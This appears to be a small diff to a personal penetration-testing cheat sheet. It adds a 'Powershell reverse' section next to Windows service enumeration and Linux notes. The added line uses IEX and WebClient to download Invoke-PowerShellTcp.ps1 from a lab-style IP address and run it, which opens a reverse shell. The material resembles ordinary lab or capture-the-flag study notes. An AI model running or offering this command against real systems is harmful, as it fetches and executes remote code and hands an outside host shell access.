@@ -4,6 +4,10 @@
 
 `wmic service where started=true get name, startname`
 
+## Powershell reverse
+
+`IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`
+
 # Linux
 
 ## Get remote script and execute
